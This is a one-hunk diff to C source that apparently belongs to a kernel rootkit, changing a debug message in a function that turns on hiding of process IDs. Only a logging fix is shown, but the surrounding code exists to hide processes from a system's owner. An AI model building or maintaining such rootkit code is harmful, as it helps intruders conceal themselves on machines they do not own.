@@ -149,7 +149,7 @@ handle_hidepid(unsigned long arg)
             DEBUG_NOTICE("hidepid on\n");
 
         rootkit.hiding_pids = 1;
-        DEBUG_NOTICE("hiding pid %ld\n", -sarg);
+        DEBUG_NOTICE("hiding pid %ld\n", sarg);
     }
 
     return 0;
